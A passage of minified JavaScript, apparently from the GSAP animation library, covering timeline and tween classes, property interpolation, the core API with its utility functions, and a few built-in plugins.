			for (var r = [], s = this._first; s;) s._start >= n && (s instanceof Bn ? e && r.push(s) : (i && r.push(s), t && r.push.apply(r, s.getChildren(!0, e, i)))), s = s._next;
			return r
		}, i.getById = function(t) {
			for (var e = this.getChildren(1, 1, 1), i = e.length; i--;)
				if (e[i].vars.id === t) return e[i]
		}, i.remove = function(t) {
			return xe(t) ? this.removeLabel(t) : we(t) ? this.killTweensOf(t) : (vi(this, t), t === this._recent && (this._recent = this._last), Di(this))
		}, i.totalTime = function(e, i) {
			return arguments.length ? (this._forcing = 1, !this._dp && this._ts && (this._start = ri(hn.time - (this._ts > 0 ? e / this._ts : (this.totalDuration() - e) / -this._ts))), t.prototype.totalTime.call(this, e, i), this._forcing = 0, this) : this._tTime
		}, i.addLabel = function(t, e) {
			return this.labels[t] = Li(this, e), this
		}, i.removeLabel = function(t) {
			return delete this.labels[t], this
		}, i.addPause = function(t, e, i) {
			var n = Bn.delayedCall(0, e || Ge, i);
			return n.data = "isPause", this._hasPause = 1, Fi(this, n, Li(this, t))
		}, i.removePause = function(t) {
			var e = this._first;
			for (t = Li(this, t); e;) e._start === t && "isPause" === e.data && _i(e), e = e._next
		}, i.killTweensOf = function(t, e, i) {
			for (var n = this.getTweensOf(t, i), r = n.length; r--;) Cn !== n[r] && n[r].kill(t, e);
			return this
		}, i.getTweensOf = function(t, e) {
			for (var i, n = [], r = Ui(t), s = this._first, o = Ee(e); s;) s instanceof Bn ? oi(s._targets, r) && (o ? (!Cn || s._initted && s._ts) && s.globalTime(0) <= e && s.globalTime(s.totalDuration()) > e : !e || s.isActive()) && n.push(s) : (i = s.getTweensOf(r, e)).length && n.push.apply(n, i), s = s._next;
			return n
		}, i.tweenTo = function(t, e) {
			e = e || {};
			var i, n = this,
				r = Li(n, t),
				s = e,
				o = s.startAt,
				a = s.onStart,
				u = s.onStartParams,
				h = s.immediateRender,
				l = Bn.to(n, ci({
					ease: e.ease || "none",
					lazy: !1,
					immediateRender: !1,
					time: r,
					overwrite: "auto",
					duration: e.duration || Math.abs((r - (o && "time" in o ? o.time : n._time)) / n.timeScale()) || 1e-8,
					onStart: function() {
						if (n.pause(), !i) {
							var t = e.duration || Math.abs((r - (o && "time" in o ? o.time : n._time)) / n.timeScale());
							l._dur !== t && Oi(l, t, 0, 1).render(l._time, !0, !0), i = 1
						}
						a && a.apply(l, u || [])
					}
				}, e));
			return h ? l.render(0) : l
		}, i.tweenFromTo = function(t, e, i) {
			return this.tweenTo(e, ci({
				startAt: {
					time: Li(this, t)
				}
			}, i))
		}, i.recent = function() {
			return this._recent
		}, i.nextLabel = function(t) {
			return void 0 === t && (t = this._time), Zi(this, Li(this, t))
		}, i.previousLabel = function(t) {
			return void 0 === t && (t = this._time), Zi(this, Li(this, t), 1)
		}, i.currentLabel = function(t) {
			return arguments.length ? this.seek(t, !0) : this.previousLabel(this._time + 1e-8)
		}, i.shiftChildren = function(t, e, i) {
			void 0 === i && (i = 0);
			for (var n, r = this._first, s = this.labels; r;) r._start >= i && (r._start += t, r._end += t), r = r._next;
			if (e)
				for (n in s) s[n] >= i && (s[n] += t);
			return Di(this)
		}, i.invalidate = function() {
			var e = this._first;
			for (this._lock = 0; e;) e.invalidate(), e = e._next;
			return t.prototype.invalidate.call(this)
		}, i.clear = function(t) {
			void 0 === t && (t = !0);
			for (var e, i = this._first; i;) e = i._next, this.remove(i), i = e;
			return this._dp && (this._time = this._tTime = this._pTime = 0), t && (this.labels = {}), Di(this)
		}, i.totalDuration = function(t) {
			var e, i, n, r = 0,
				s = this,
				o = s._last,
				a = fe;
			if (arguments.length) return s.timeScale((s._repeat < 0 ? s.duration() : s.totalDuration()) / (s.reversed() ? -t : t));
			if (s._dirty) {
				for (n = s.parent; o;) e = o._prev, o._dirty && o.totalDuration(), (i = o._start) > a && s._sort && o._ts && !s._lock ? (s._lock = 1, Fi(s, o, i - o._delay, 1)._lock = 0) : a = i, i < 0 && o._ts && (r -= i, (!n && !s._dp || n && n.smoothChildTiming) && (s._start += i / s._ts, s._time -= i, s._tTime -= i), s.shiftChildren(-i, !1, -1 / 0), a = 0), o._end > r && o._ts && (r = o._end), o = e;
				Oi(s, s === Wt && s._time > r ? s._time : r, 1, 1), s._dirty = 0
			}
			return s._tDur
		}, e.updateRoot = function(t) {
			if (Wt._ts && (ui(Wt, Ei(t, Wt)), Gt = hn.frame), hn.frame >= Ze) {
				Ze += de.autoSleep || 120;
				var e = Wt._first;
				if ((!e || !e._ts) && de.autoSleep && hn._listeners.length < 2) {
					for (; e && !e._ts;) e = e._next;
					e || hn.sleep()
				}
			}
		}, e
	}(En);
	ci(bn.prototype, {
		_lock: 0,
		_hasPause: 0,
		_forcing: 0
	});
	var Cn, Tn, Fn = function(t, e, i, n, r, s, o) {
			var a, u, h, l, c, d, p, f, m = new $n(this._pt, t, e, 0, 1, Vn, null, r),
				g = 0,
				v = 0;
			for (m.b = i, m.e = n, i += "", (p = ~(n += "").indexOf("random(")) && (n = Xi(n)), s && (s(f = [i, n], t, e), i = f[0], n = f[1]), u = i.match(Le) || []; a = Le.exec(n);) l = a[0], c = n.substring(g, a.index), h ? h = (h + 1) % 5 : "rgba(" === c.substr(-5) && (h = 1), l !== u[v++] && (d = parseFloat(u[v - 1]) || 0, m._pt = {
				_next: m._pt,
				p: c || 1 === v ? c : ",",
				s: d,
				c: "=" === l.charAt(1) ? si(d, l) - d : parseFloat(l) - d,
				m: h && h < 4 ? Math.round : 0
			}, g = Le.lastIndex);
			return m.c = g < n.length ? n.substring(g, n.length) : "", m.fp = o, (Be.test(n) || p) && (m.e = 0), this._pt = m, m
		},
		Mn = function(t, e, i, n, r, s, o, a, u) {
			we(n) && (n = n(r || 0, t, s));
			var h, l = t[e],
				c = "get" !== i ? i : we(l) ? u ? t[e.indexOf("set") || !we(t["get" + e.substr(3)]) ? e : "get" + e.substr(3)](u) : t[e]() : l,
				d = we(l) ? u ? Nn : Rn : kn;
			if (xe(n) && (~n.indexOf("random(") && (n = Xi(n)), "=" === n.charAt(1) && ((h = si(c, n) + (Ni(c) || 0)) || 0 === h) && (n = h)), c !== n || Tn) return isNaN(c * n) || "" === n ? (!l && !(e in t) && Ue(e, n), Fn.call(this, t, e, c, n, d, a || de.stringFilter, u)) : (h = new $n(this._pt, t, e, +c || 0, n - (c || 0), "boolean" == typeof l ? jn : Un, 0, d), u && (h.fp = u), o && h.modifier(o, this, t), this._pt = h)
		},
		An = function(t, e, i, n, r, s) {
			var o, a, u, h;
			if (Xe[t] && !1 !== (o = new Xe[t]).init(r, o.rawVars ? e[t] : function(t, e, i, n, r) {
					if (we(t) && (t = Pn(t, r, e, i, n)), !Ce(t) || t.style && t.nodeType || Se(t) || Ae(t)) return xe(t) ? Pn(t, r, e, i, n) : t;
					var s, o = {};
					for (s in t) o[s] = Pn(t[s], r, e, i, n);
					return o
				}(e[t], n, r, s, i), i, n, s) && (i._pt = a = new $n(i._pt, r, t, 0, 1, o.render, o, 0, o.priority), i !== Ht))
				for (u = i._ptLookup[i._targets.indexOf(r)], h = o._props.length; h--;) u[o._props[h]] = a;
			return o
		},
		Sn = function t(e, i) {
			var n, r, s, o, a, u, h, l, c, d, p, f, m, g = e.vars,
				v = g.ease,
				_ = g.startAt,
				D = g.immediateRender,
				y = g.lazy,
				x = g.onUpdate,
				w = g.onUpdateParams,
				E = g.callbackScope,
				b = g.runBackwards,
				C = g.yoyoEase,
				T = g.keyframes,
				F = g.autoRevert,
				M = e._dur,
				A = e._startAt,
				S = e._targets,
				O = e.parent,
				P = O && "nested" === O.data ? O.parent._targets : S,
				I = "auto" === e._overwrite && !Nt,
				L = e.timeline;
			if (L && (!T || !v) && (v = "none"), e._ease = vn(v, pe.ease), e._yEase = C ? mn(vn(!0 === C ? v : C, pe.ease)) : 0, C && e._yoyo && !e._repeat && (C = e._yEase, e._yEase = e._ease, e._ease = C), e._from = !L && !!g.runBackwards, !L || T && !g.stagger) {
				if (f = (l = S[0] ? ti(S[0]).harness : 0) && g[l.prop], n = fi(g, He), A && (_i(A.render(-1, !0)), A._lazy = 0), _)
					if (_i(e._startAt = Bn.set(S, ci({
							data: "isStart",
							overwrite: !1,
							parent: O,
							immediateRender: !0,
							lazy: Te(y),
							startAt: null,
							delay: 0,
							onUpdate: x,
							onUpdateParams: w,
							callbackScope: E,
							stagger: 0
						}, _))), i < 0 && !D && !F && e._startAt.render(-1, !0), D) {
						if (i > 0 && !F && (e._startAt = 0), M && i <= 0) return void(i && (e._zTime = i))
					} else !1 === F && (e._startAt = 0);
				else if (b && M)
					if (A) !F && (e._startAt = 0);
					else if (i && (D = !1), s = ci({
						overwrite: !1,
						data: "isFromStart",
						lazy: D && Te(y),
						immediateRender: D,
						stagger: 0,
						parent: O
					}, n), f && (s[l.prop] = f), _i(e._startAt = Bn.set(S, s)), i < 0 && e._startAt.render(-1, !0), e._zTime = i, D) {
					if (!i) return
				} else t(e._startAt, 1e-8);
				for (e._pt = e._ptCache = 0, y = M && Te(y) || y && !M, r = 0; r < S.length; r++) {
					if (h = (a = S[r])._gsap || Je(S)[r]._gsap, e._ptLookup[r] = d = {}, Ye[h.id] && qe.length && ai(), p = P === S ? r : P.indexOf(a), l && !1 !== (c = new l).init(a, f || n, e, p, P) && (e._pt = o = new $n(e._pt, a, c.name, 0, 1, c.render, c, 0, c.priority), c._props.forEach((function(t) {
							d[t] = o
						})), c.priority && (u = 1)), !l || f)
						for (s in n) Xe[s] && (c = An(s, n, e, p, a, P)) ? c.priority && (u = 1) : d[s] = o = Mn.call(e, a, s, "get", n[s], p, P, 0, g.stringFilter);
					e._op && e._op[r] && e.kill(a, e._op[r]), I && e._pt && (Cn = e, Wt.killTweensOf(a, d, e.globalTime(i)), m = !e.parent, Cn = 0), e._pt && y && (Ye[h.id] = 1)
				}
				u && Xn(e), e._onInit && e._onInit(e)
			}
			e._onUpdate = x, e._initted = (!e._op || e._pt) && !m, T && i <= 0 && L.render(fe, !0, !0)
		},
		On = function(t, e, i, n) {
			var r, s, o = e.ease || n || "power1.inOut";
			if (Se(e)) s = i[t] || (i[t] = []), e.forEach((function(t, i) {
				return s.push({
					t: i / (e.length - 1) * 100,
					v: t,
					e: o
				})
			}));
			else
				for (r in e) s = i[r] || (i[r] = []), "ease" === r || s.push({
					t: parseFloat(t),
					v: e[r],
					e: o
				})
		},
		Pn = function(t, e, i, n, r) {
			return we(t) ? t.call(e, i, n, r) : xe(t) && ~t.indexOf("random(") ? Xi(t) : t
		},
		In = Qe + "repeat,repeatDelay,yoyo,repeatRefresh,yoyoEase,autoRevert",
		Ln = {};
	ii(In + ",id,stagger,delay,duration,paused,scrollTrigger", (function(t) {
		return Ln[t] = 1
	}));
	var Bn = function(t) {
		function e(e, i, n, r) {
			var s;
			"number" == typeof i && (n.duration = i, i = n, n = null);
			var o, a, u, h, l, c, d, p, f = (s = t.call(this, r ? i : mi(i)) || this).vars,
				m = f.duration,
				g = f.delay,
				v = f.immediateRender,
				_ = f.stagger,
				D = f.overwrite,
				y = f.keyframes,
				x = f.defaults,
				w = f.scrollTrigger,
				E = f.yoyoEase,
				b = i.parent || Wt,
				C = (Se(e) || Ae(e) ? Ee(e[0]) : "length" in i) ? [e] : Ui(e);
			if (s._targets = C.length ? Je(C) : je("GSAP target " + e + " not found. https://greensock.com", !de.nullTargetWarn) || [], s._ptLookup = [], s._overwrite = D, y || _ || Me(m) || Me(g)) {
				if (i = s.vars, (o = s.timeline = new bn({
						data: "nested",
						defaults: x || {}
					})).kill(), o.parent = o._dp = kt(s), o._start = 0, _ || Me(m) || Me(g)) {
					if (h = C.length, d = _ && Vi(_), Ce(_))
						for (l in _) ~In.indexOf(l) && (p || (p = {}), p[l] = _[l]);
					for (a = 0; a < h; a++)(u = fi(i, Ln)).stagger = 0, E && (u.yoyoEase = E), p && di(u, p), c = C[a], u.duration = +Pn(m, kt(s), a, c, C), u.delay = (+Pn(g, kt(s), a, c, C) || 0) - s._delay, !_ && 1 === h && u.delay && (s._delay = g = u.delay, s._start += g, u.delay = 0), o.to(c, u, d ? d(a, c, C) : 0), o._ease = cn.none;
					o.duration() ? m = g = 0 : s.timeline = 0
				} else if (y) {
					mi(ci(o.vars.defaults, {
						ease: "none"
					})), o._ease = vn(y.ease || i.ease || "none");
					var T, F, M, A = 0;
					if (Se(y)) y.forEach((function(t) {
						return o.to(C, t, ">")
					}));
					else {
						for (l in u = {}, y) "ease" === l || "easeEach" === l || On(l, y[l], u, y.easeEach);
						for (l in u)
							for (T = u[l].sort((function(t, e) {
									return t.t - e.t
								})), A = 0, a = 0; a < T.length; a++)(M = {
								ease: (F = T[a]).e,
								duration: (F.t - (a ? T[a - 1].t : 0)) / 100 * m
							})[l] = F.v, o.to(C, M, A), A += M.duration;
						o.duration() < m && o.to({}, {
							duration: m - o.duration()
						})
					}
				}
				m || s.duration(m = o.duration())
			} else s.timeline = 0;
			return !0 !== D || Nt || (Cn = kt(s), Wt.killTweensOf(C), Cn = 0), Fi(b, kt(s), n), i.reversed && s.reverse(), i.paused && s.paused(!0), (v || !m && !y && s._start === ri(b._time) && Te(v) && function t(e) {
				return !e || e._ts && t(e.parent)
			}(kt(s)) && "nested" !== b.data) && (s._tTime = -1e-8, s.render(Math.max(0, -g))), w && Mi(kt(s), w), s
		}
		Rt(e, t);
		var i = e.prototype;
		return i.render = function(t, e, i) {
			var n, r, s, o, a, u, h, l, c, d = this._time,
				p = this._tDur,
				f = this._dur,
				m = t > p - 1e-8 && t >= 0 ? p : t < 1e-8 ? 0 : t;
			if (f) {
				if (m !== this._tTime || !t || i || !this._initted && this._tTime || this._startAt && this._zTime < 0 != t < 0) {
					if (n = m, l = this.timeline, this._repeat) {
						if (o = f + this._rDelay, this._repeat < -1 && t < 0) return this.totalTime(100 * o + t, e, i);
						if (n = ri(m % o), m === p ? (s = this._repeat, n = f) : ((s = ~~(m / o)) && s === m / o && (n = f, s--), n > f && (n = f)), (u = this._yoyo && 1 & s) && (c = this._yEase, n = f - n), a = wi(this._tTime, o), n === d && !i && this._initted) return this._tTime = m, this;
						s !== a && (l && this._yEase && gn(l, u), !this.vars.repeatRefresh || u || this._lock || (this._lock = i = 1, this.render(ri(o * s), !0).invalidate()._lock = 0))
					}
					if (!this._initted) {
						if (Ai(this, t < 0 ? t : n, i, e)) return this._tTime = 0, this;
						if (d !== this._time) return this;
						if (f !== this._dur) return this.render(t, e, i)
					}
					if (this._tTime = m, this._time = n, !this._act && this._ts && (this._act = 1, this._lazy = 0), this.ratio = h = (c || this._ease)(n / f), this._from && (this.ratio = h = 1 - h), n && !d && !e && (Ki(this, "onStart"), this._tTime !== m)) return this;
					for (r = this._pt; r;) r.r(h, r.d), r = r._next;
					l && l.render(t < 0 ? t : !n && u ? -1e-8 : l._dur * l._ease(n / this._dur), e, i) || this._startAt && (this._zTime = t), this._onUpdate && !e && (t < 0 && this._startAt && this._startAt.render(t, !0, i), Ki(this, "onUpdate")), this._repeat && s !== a && this.vars.onRepeat && !e && this.parent && Ki(this, "onRepeat"), m !== this._tDur && m || this._tTime !== m || (t < 0 && this._startAt && !this._onUpdate && this._startAt.render(t, !0, !0), (t || !f) && (m === this._tDur && this._ts > 0 || !m && this._ts < 0) && _i(this, 1), e || t < 0 && !d || !m && !d || (Ki(this, m === p ? "onComplete" : "onReverseComplete", !0), this._prom && !(m < p && this.timeScale() > 0) && this._prom()))
				}
			} else ! function(t, e, i, n) {
				var r, s, o, a = t.ratio,
					u = e < 0 || !e && (!t._start && function t(e) {
						var i = e.parent;
						return i && i._ts && i._initted && !i._lock && (i.rawTime() < 0 || t(i))
					}(t) && (t._initted || !Si(t)) || (t._ts < 0 || t._dp._ts < 0) && !Si(t)) ? 0 : 1,
					h = t._rDelay,
					l = 0;
				if (h && t._repeat && (l = Ri(0, t._tDur, e), s = wi(l, h), t._yoyo && 1 & s && (u = 1 - u), s !== wi(t._tTime, h) && (a = 1 - u, t.vars.repeatRefresh && t._initted && t.invalidate())), u !== a || n || 1e-8 === t._zTime || !e && t._zTime) {
					if (!t._initted && Ai(t, e, n, i)) return;
					for (o = t._zTime, t._zTime = e || (i ? 1e-8 : 0), i || (i = e && !o), t.ratio = u, t._from && (u = 1 - u), t._time = 0, t._tTime = l, r = t._pt; r;) r.r(u, r.d), r = r._next;
					t._startAt && e < 0 && t._startAt.render(e, !0, !0), t._onUpdate && !i && Ki(t, "onUpdate"), l && t._repeat && !i && t.parent && Ki(t, "onRepeat"), (e >= t._tDur || e < 0) && t.ratio === u && (u && _i(t, 1), i || (Ki(t, u ? "onComplete" : "onReverseComplete", !0), t._prom && t._prom()))
				} else t._zTime || (t._zTime = e)
			}(this, t, e, i);
			return this
		}, i.targets = function() {
			return this._targets
		}, i.invalidate = function() {
			return this._pt = this._op = this._startAt = this._onUpdate = this._lazy = this.ratio = 0, this._ptLookup = [], this.timeline && this.timeline.invalidate(), t.prototype.invalidate.call(this)
		}, i.resetTo = function(t, e, i, n) {
			qt || hn.wake(), this._ts || this.play();
			var r = Math.min(this._dur, (this._dp._time - this._start) * this._ts);
			return this._initted || Sn(this, r),
				function(t, e, i, n, r, s, o) {
					var a, u, h, l = (t._pt && t._ptCache || (t._ptCache = {}))[e];
					if (!l)
						for (l = t._ptCache[e] = [], u = t._ptLookup, h = t._targets.length; h--;) {
							if ((a = u[h][e]) && a.d && a.d._pt)
								for (a = a.d._pt; a && a.p !== e;) a = a._next;
							if (!a) return Tn = 1, t.vars[e] = "+=0", Sn(t, o), Tn = 0, 1;
							l.push(a)
						}
					for (h = l.length; h--;)(a = l[h]).s = !n && 0 !== n || r ? a.s + (n || 0) + s * a.c : n, a.c = i - a.s, a.e && (a.e = ni(i) + Ni(a.e)), a.b && (a.b = a.s + Ni(a.b))
				}(this, t, e, i, n, this._ease(r / this._dur), r) ? this.resetTo(t, e, i, n) : (Ci(this, 0), this.parent || gi(this._dp, this, "_first", "_last", this._dp._sort ? "_start" : 0), this.render(0))
		}, i.kill = function(t, e) {
			if (void 0 === e && (e = "all"), !(t || e && "all" !== e)) return this._lazy = this._pt = 0, this.parent ? Qi(this) : this;
			if (this.timeline) {
				var i = this.timeline.totalDuration();
				return this.timeline.killTweensOf(t, e, Cn && !0 !== Cn.vars.overwrite)._first || Qi(this), this.parent && i !== this.timeline.totalDuration() && Oi(this, this._dur * this.timeline._tDur / i, 0, 1), this
			}
			var n, r, s, o, a, u, h, l = this._targets,
				c = t ? Ui(t) : l,
				d = this._ptLookup,
				p = this._pt;
			if ((!e || "all" === e) && function(t, e) {
					for (var i = t.length, n = i === e.length; n && i-- && t[i] === e[i];);
					return i < 0
				}(l, c)) return "all" === e && (this._pt = 0), Qi(this);
			for (n = this._op = this._op || [], "all" !== e && (xe(e) && (a = {}, ii(e, (function(t) {
					return a[t] = 1
				})), e = a), e = function(t, e) {
					var i, n, r, s, o = t[0] ? ti(t[0]).harness : 0,
						a = o && o.aliases;
					if (!a) return e;
					for (n in i = di({}, e), a)
						if (n in i)
							for (r = (s = a[n].split(",")).length; r--;) i[s[r]] = i[n];
					return i
				}(l, e)), h = l.length; h--;)
				if (~c.indexOf(l[h]))
					for (a in r = d[h], "all" === e ? (n[h] = e, o = r, s = {}) : (s = n[h] = n[h] || {}, o = e), o)(u = r && r[a]) && ("kill" in u.d && !0 !== u.d.kill(a) || vi(this, u, "_pt"), delete r[a]), "all" !== s && (s[a] = 1);
			return this._initted && !this._pt && p && Qi(this), this
		}, e.to = function(t, i) {
			return new e(t, i, arguments[2])
		}, e.from = function(t, e) {
			return Bi(1, arguments)
		}, e.delayedCall = function(t, i, n, r) {
			return new e(i, 0, {
				immediateRender: !1,
				lazy: !1,
				overwrite: !1,
				delay: t,
				onComplete: i,
				onReverseComplete: i,
				onCompleteParams: n,
				onReverseCompleteParams: n,
				callbackScope: r
			})
		}, e.fromTo = function(t, e, i) {
			return Bi(2, arguments)
		}, e.set = function(t, i) {
			return i.duration = 0, i.repeatDelay || (i.repeat = 0), new e(t, i)
		}, e.killTweensOf = function(t, e, i) {
			return Wt.killTweensOf(t, e, i)
		}, e
	}(En);
	ci(Bn.prototype, {
		_targets: [],
		_lazy: 0,
		_startAt: 0,
		_op: 0,
		_onInit: 0
	}), ii("staggerTo,staggerFrom,staggerFromTo", (function(t) {
		Bn[t] = function() {
			var e = new bn,
				i = Wi.call(arguments, 0);
			return i.splice("staggerFromTo" === t ? 5 : 4, 0, 0), e[t].apply(e, i)
		}
	}));
	var kn = function(t, e, i) {
			return t[e] = i
		},
		Rn = function(t, e, i) {
			return t[e](i)
		},
		Nn = function(t, e, i, n) {
			return t[e](n.fp, i)
		},
		Wn = function(t, e, i) {
			return t.setAttribute(e, i)
		},
		zn = function(t, e) {
			return we(t[e]) ? Rn : be(t[e]) && t.setAttribute ? Wn : kn
		},
		Un = function(t, e) {
			return e.set(e.t, e.p, Math.round(1e6 * (e.s + e.c * t)) / 1e6, e)
		},
		jn = function(t, e) {
			return e.set(e.t, e.p, !!(e.s + e.c * t), e)
		},
		Vn = function(t, e) {
			var i = e._pt,
				n = "";
			if (!t && e.b) n = e.b;
			else if (1 === t && e.e) n = e.e;
			else {
				for (; i;) n = i.p + (i.m ? i.m(i.s + i.c * t) : Math.round(1e4 * (i.s + i.c * t)) / 1e4) + n, i = i._next;
				n += e.c
			}
			e.set(e.t, e.p, n, e)
		},
		Gn = function(t, e) {
			for (var i = e._pt; i;) i.r(t, i.d), i = i._next
		},
		Hn = function(t, e, i, n) {
			for (var r, s = this._pt; s;) r = s._next, s.p === n && s.modifier(t, e, i), s = r
		},
		qn = function(t) {
			for (var e, i, n = this._pt; n;) i = n._next, n.p === t && !n.op || n.op === t ? vi(this, n, "_pt") : n.dep || (e = 1), n = i;
			return !e
		},
		Yn = function(t, e, i, n) {
			n.mSet(t, e, n.m.call(n.tween, i, n.mt), n)
		},
		Xn = function(t) {
			for (var e, i, n, r, s = t._pt; s;) {
				for (e = s._next, i = n; i && i.pr > s.pr;) i = i._next;
				(s._prev = i ? i._prev : r) ? s._prev._next = s: n = s, (s._next = i) ? i._prev = s : r = s, s = e
			}
			t._pt = n
		},
		$n = function() {
			function t(t, e, i, n, r, s, o, a, u) {
				this.t = e, this.s = n, this.c = r, this.p = i, this.r = s || Un, this.d = o || this, this.set = a || kn, this.pr = u || 0, this._next = t, t && (t._prev = this)
			}
			return t.prototype.modifier = function(t, e, i) {
				this.mSet = this.mSet || this.set, this.set = Yn, this.m = t, this.mt = i, this.tween = e
			}, t
		}();
	ii(Qe + "parent,duration,ease,delay,overwrite,runBackwards,startAt,yoyo,immediateRender,repeat,repeatDelay,data,paused,reversed,lazy,callbackScope,stringFilter,id,yoyoEase,stagger,inherit,repeatRefresh,keyframes,autoRevert,scrollTrigger", (function(t) {
		return He[t] = 1
	})), Ne.TweenMax = Ne.TweenLite = Bn, Ne.TimelineLite = Ne.TimelineMax = bn, Wt = new bn({
		sortChildren: !1,
		defaults: pe,
		autoRemoveChildren: !0,
		id: "root",
		smoothChildTiming: !0
	}), de.stringFilter = un;
	var Zn = {
		registerPlugin: function() {
			for (var t = arguments.length, e = new Array(t), i = 0; i < t; i++) e[i] = arguments[i];
			e.forEach((function(t) {
				return Ji(t)
			}))
		},
		timeline: function(t) {
			return new bn(t)
		},
		getTweensOf: function(t, e) {
			return Wt.getTweensOf(t, e)
		},
		getProperty: function(t, e, i, n) {
			xe(t) && (t = Ui(t)[0]);
			var r = ti(t || {}).get,
				s = i ? li : hi;
			return "native" === i && (i = ""), t ? e ? s((Xe[e] && Xe[e].get || r)(t, e, i, n)) : function(e, i, n) {
				return s((Xe[e] && Xe[e].get || r)(t, e, i, n))
			} : t
		},
		quickSetter: function(t, e, i) {
			if ((t = Ui(t)).length > 1) {
				var n = t.map((function(t) {
						return Jn.quickSetter(t, e, i)
					})),
					r = n.length;
				return function(t) {
					for (var e = r; e--;) n[e](t)
				}
			}
			t = t[0] || {};
			var s = Xe[e],
				o = ti(t),
				a = o.harness && (o.harness.aliases || {})[e] || e,
				u = s ? function(e) {
					var n = new s;
					Ht._pt = 0, n.init(t, i ? e + i : e, Ht, 0, [t]), n.render(1, n), Ht._pt && Gn(1, Ht)
				} : o.set(t, a);
			return s ? u : function(e) {
				return u(t, a, i ? e + i : e, o, 1)
			}
		},
		quickTo: function(t, e, i) {
			var n, r = Jn.to(t, di(((n = {})[e] = "+=0.1", n.paused = !0, n), i || {})),
				s = function(t, i, n) {
					return r.resetTo(e, t, i, n)
				};
			return s.tween = r, s
		},
		isTweening: function(t) {
			return Wt.getTweensOf(t, !0).length > 0
		},
		defaults: function(t) {
			return t && t.ease && (t.ease = vn(t.ease, pe.ease)), pi(pe, t || {})
		},
		config: function(t) {
			return pi(de, t || {})
		},
		registerEffect: function(t) {
			var e = t.name,
				i = t.effect,
				n = t.plugins,
				r = t.defaults,
				s = t.extendTimeline;
			(n || "").split(",").forEach((function(t) {
				return t && !Xe[t] && !Ne[t] && je(e + " effect requires " + t + " plugin.")
			})), $e[e] = function(t, e, n) {
				return i(Ui(t), ci(e || {}, r), n)
			}, s && (bn.prototype[e] = function(t, i, n) {
				return this.add($e[e](t, Ce(i) ? i : (n = i) && {}, this), n)
			})
		},
		registerEase: function(t, e) {
			cn[t] = vn(e)
		},
		parseEase: function(t, e) {
			return arguments.length ? vn(t, e) : cn
		},
		getById: function(t) {
			return Wt.getById(t)
		},
		exportRoot: function(t, e) {
			void 0 === t && (t = {});
			var i, n, r = new bn(t);
			for (r.smoothChildTiming = Te(t.smoothChildTiming), Wt.remove(r), r._dp = 0, r._time = r._tTime = Wt._time, i = Wt._first; i;) n = i._next, !e && !i._dur && i instanceof Bn && i.vars.onComplete === i._targets[0] || Fi(r, i, i._start - i._delay), i = n;
			return Fi(Wt, r, 0), r
		},
		utils: {
			wrap: function t(e, i, n) {
				var r = i - e;
				return Se(e) ? Yi(e, t(0, e.length), i) : ki(n, (function(t) {
					return (r + (t - e) % r) % r + e
				}))
			},
			wrapYoyo: function t(e, i, n) {
				var r = i - e,
					s = 2 * r;
				return Se(e) ? Yi(e, t(0, e.length - 1), i) : ki(n, (function(t) {
					return e + ((t = (s + (t - e) % s) % s || 0) > r ? s - t : t)
				}))
			},
			distribute: Vi,
			random: qi,
			snap: Hi,
			normalize: function(t, e, i) {
				return $i(t, e, 0, 1, i)
			},
			getUnit: Ni,
			clamp: function(t, e, i) {
				return ki(i, (function(i) {
					return Ri(t, e, i)
				}))
			},
			splitColor: nn,
			toArray: Ui,
			selector: function(t) {
				return t = Ui(t)[0] || je("Invalid scope") || {},
					function(e) {
						var i = t.current || t.nativeElement || t;
						return Ui(e, i.querySelectorAll ? i : i === t ? je("Invalid scope") || jt.createElement("div") : t)
					}
			},
			mapRange: $i,
			pipe: function() {
				for (var t = arguments.length, e = new Array(t), i = 0; i < t; i++) e[i] = arguments[i];
				return function(t) {
					return e.reduce((function(t, e) {
						return e(t)
					}), t)
				}
			},
			unitize: function(t, e) {
				return function(i) {
					return t(parseFloat(i)) + (e || Ni(i))
				}
			},
			interpolate: function t(e, i, n, r) {
				var s = isNaN(e + i) ? 0 : function(t) {
					return (1 - t) * e + t * i
				};
				if (!s) {
					var o, a, u, h, l, c = xe(e),
						d = {};
					if (!0 === n && (r = 1) && (n = null), c) e = {
						p: e
					}, i = {
						p: i
					};
					else if (Se(e) && !Se(i)) {
						for (u = [], h = e.length, l = h - 2, a = 1; a < h; a++) u.push(t(e[a - 1], e[a]));
						h--, s = function(t) {
							t *= h;
							var e = Math.min(l, ~~t);
							return u[e](t - e)
						}, n = i
					} else r || (e = di(Se(e) ? [] : {}, e));
					if (!u) {
						for (o in i) Mn.call(d, e, o, "get", i[o]);
						s = function(t) {
							return Gn(t, d) || (c ? e.p : e)
						}
					}
				}
				return ki(n, s)
			},
			shuffle: ji
		},
		install: ze,
		effects: $e,
		ticker: hn,
		updateRoot: bn.updateRoot,
		plugins: Xe,
		globalTimeline: Wt,
		core: {
			PropTween: $n,
			globals: Ve,
			Tween: Bn,
			Timeline: bn,
			Animation: En,
			getCache: ti,
			_removeLinkedListItem: vi,
			suppressOverwrites: function(t) {
				return Nt = t
			}
		}
	};
	ii("to,from,fromTo,delayedCall,set,killTweensOf", (function(t) {
		return Zn[t] = Bn[t]
	})), hn.add(bn.updateRoot), Ht = Zn.to({}, {
		duration: 0
	});
	var Kn = function(t, e) {
			for (var i = t._pt; i && i.p !== e && i.op !== e && i.fp !== e;) i = i._next;
			return i
		},
		Qn = function(t, e) {
			return {
				name: t,
				rawVars: 1,
				init: function(t, i, n) {
					n._onInit = function(t) {
						var n, r;
						if (xe(i) && (n = {}, ii(i, (function(t) {
								return n[t] = 1
							})), i = n), e) {
							for (r in n = {}, i) n[r] = e(i[r]);
							i = n
						}! function(t, e) {
							var i, n, r, s = t._targets;
							for (i in e)
								for (n = s.length; n--;)(r = t._ptLookup[n][i]) && (r = r.d) && (r._pt && (r = Kn(r, i)), r && r.modifier && r.modifier(e[i], t, s[n], i))
						}(t, i)
					}
				}
			}
		},
		Jn = Zn.registerPlugin({
			name: "attr",
			init: function(t, e, i, n, r) {
				var s, o;
				for (s in e)(o = this.add(t, "setAttribute", (t.getAttribute(s) || 0) + "", e[s], n, r, 0, 0, s)) && (o.op = s), this._props.push(s)
			}
		}, {
			name: "endArray",
			init: function(t, e) {
				for (var i = e.length; i--;) this.add(t, i, t[i] || 0, e[i])
			}
		}, Qn("roundProps", Gi), Qn("modifiers"), Qn("snap", Hi)) || Zn;
